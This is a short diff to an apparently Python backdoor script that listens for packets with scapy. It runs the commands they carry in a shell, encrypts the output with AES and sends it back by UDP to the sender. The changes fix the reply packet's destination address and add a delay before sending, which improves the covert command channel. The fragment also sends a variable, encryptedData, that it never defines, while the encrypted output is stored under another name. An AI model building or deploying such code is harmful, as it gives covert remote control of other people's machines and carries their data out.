@@ -5,6 +5,7 @@ import os
 import argparse
 import platform
 import subprocess
+import time
 from Crypto.Cipher import AES
 from ctypes import *
 from scapy.all import *
@@ -43,7 +44,8 @@ def runCommand(packet):
   print "Running command " + data
   output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
   encryptedOutput = encryptionObject.encrypt(output)
-  packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
+  packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
+  time.sleep(0.1)
   send(packet)
 
 # if
